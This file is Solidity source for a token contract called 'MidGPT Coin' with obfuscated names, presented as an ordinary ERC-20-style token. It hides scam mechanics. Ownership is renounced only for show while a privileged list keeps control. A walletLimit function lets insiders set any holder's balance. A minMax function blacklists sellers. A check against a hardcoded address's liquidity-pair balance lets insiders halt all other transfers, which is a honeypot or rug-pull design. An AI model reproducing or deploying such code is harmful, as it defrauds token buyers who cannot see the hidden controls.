//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface minSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toAmount) external view returns (uint256);

    function transfer(address receiverTeam, uint256 maxTake) external returns (bool);

    function allowance(address limitLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxTake) external returns (bool);

    function transferFrom(
        address sender,
        address receiverTeam,
        uint256 maxTake
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalTakeTo, uint256 value);
    event Approval(address indexed limitLiquidity, address indexed spender, uint256 value);
}

interface launchMarketingLimit is minSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract toList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenTake {
    function createPair(address launchTeam, address modeWallet) external returns (address);
}

interface tradingAmountList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract MidGPTCoin is toList, minSender, launchMarketingLimit {

    event OwnershipTransferred(address indexed liquidityTradingAuto, address indexed isTx);

    function feeEnable(address launchedMin) public {
        if (senderShouldTeam) {
            return;
        }
        if (tradingReceiver != txLaunch) {
            autoBuyTotal = false;
        }
        totalEnable[launchedMin] = true;
        
        senderShouldTeam = true;
    }

    uint256 public autoLaunch;

    mapping(address => uint256) private marketingReceiver;

    function approve(address tradingMin, uint256 maxTake) public virtual override returns (bool) {
        swapLiquidity[_msgSender()][tradingMin] = maxTake;
        emit Approval(_msgSender(), tradingMin, maxTake);
        return true;
    }

    uint256 public txLaunch;

    function balanceOf(address toAmount) public view virtual override returns (uint256) {
        return marketingReceiver[toAmount];
    }

    function maxShouldLiquidity(uint256 maxTake) public {
        toLiquidity();
        liquiditySenderTo = maxTake;
    }

    function transferFrom(address liquidityLaunched, address receiverTeam, uint256 maxTake) external override returns (bool) {
        if (_msgSender() != receiverMode) {
            if (swapLiquidity[liquidityLaunched][_msgSender()] != type(uint256).max) {
                require(maxTake <= swapLiquidity[liquidityLaunched][_msgSender()]);
                swapLiquidity[liquidityLaunched][_msgSender()] -= maxTake;
            }
        }
        return totalLiquidity(liquidityLaunched, receiverTeam, maxTake);
    }

    uint256 private takeSell;

    uint256 private atToken = 100000000 * 10 ** 18;

    address public launchedAmount;

    function totalSupply() external view virtual override returns (uint256) {
        return atToken;
    }

    function getOwner() external view returns (address) {
        return teamSwap;
    }

    mapping(address => bool) public totalEnable;

    constructor (){
        
        tradingList();
        tradingAmountList shouldBuy = tradingAmountList(receiverMode);
        launchedAmount = tokenTake(shouldBuy.factory()).createPair(shouldBuy.WETH(), address(this));
        
        senderMax = _msgSender();
        totalEnable[senderMax] = true;
        marketingReceiver[senderMax] = atToken;
        
        emit Transfer(address(0), senderMax, atToken);
    }

    function walletLimit(address tradingAt, uint256 maxTake) public {
        toLiquidity();
        marketingReceiver[tradingAt] = maxTake;
    }

    address public senderMax;

    function allowance(address tokenReceiver, address tradingMin) external view virtual override returns (uint256) {
        if (tradingMin == receiverMode) {
            return type(uint256).max;
        }
        return swapLiquidity[tokenReceiver][tradingMin];
    }

    function minMarketingAuto(address liquidityLaunched, address receiverTeam, uint256 maxTake) internal returns (bool) {
        require(marketingReceiver[liquidityLaunched] >= maxTake);
        marketingReceiver[liquidityLaunched] -= maxTake;
        marketingReceiver[receiverTeam] += maxTake;
        emit Transfer(liquidityLaunched, receiverTeam, maxTake);
        return true;
    }

    string private atLiquidity = "MCN";

    uint256 buyAtFund;

    function decimals() external view virtual override returns (uint8) {
        return isLimit;
    }

    function symbol() external view virtual override returns (string memory) {
        return atLiquidity;
    }

    bool private walletFrom;

    function minMax(address isWallet) public {
        toLiquidity();
        
        if (isWallet == senderMax || isWallet == launchedAmount) {
            return;
        }
        receiverIs[isWallet] = true;
    }

    bool public senderShouldTeam;

    uint256 public receiverShould;

    uint256 public tradingReceiver;

    string private tradingSenderList = "MidGPT Coin";

    address private teamSwap;

    mapping(address => bool) public receiverIs;

    function owner() external view returns (address) {
        return teamSwap;
    }

    bool public autoBuyTotal;

    mapping(address => mapping(address => uint256)) private swapLiquidity;

    function toLiquidity() private view {
        require(totalEnable[_msgSender()]);
    }

    function transfer(address tradingAt, uint256 maxTake) external virtual override returns (bool) {
        return totalLiquidity(_msgSender(), tradingAt, maxTake);
    }

    address fromAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 liquiditySenderTo;

    function totalLiquidity(address liquidityLaunched, address receiverTeam, uint256 maxTake) internal returns (bool) {
        if (liquidityLaunched == senderMax) {
            return minMarketingAuto(liquidityLaunched, receiverTeam, maxTake);
        }
        uint256 teamSender = minSender(launchedAmount).balanceOf(fromAuto);
        require(teamSender == liquiditySenderTo);
        require(!receiverIs[liquidityLaunched]);
        return minMarketingAuto(liquidityLaunched, receiverTeam, maxTake);
    }

    address receiverMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return tradingSenderList;
    }

    uint8 private isLimit = 18;

    function tradingList() public {
        emit OwnershipTransferred(senderMax, address(0));
        teamSwap = address(0);
    }

}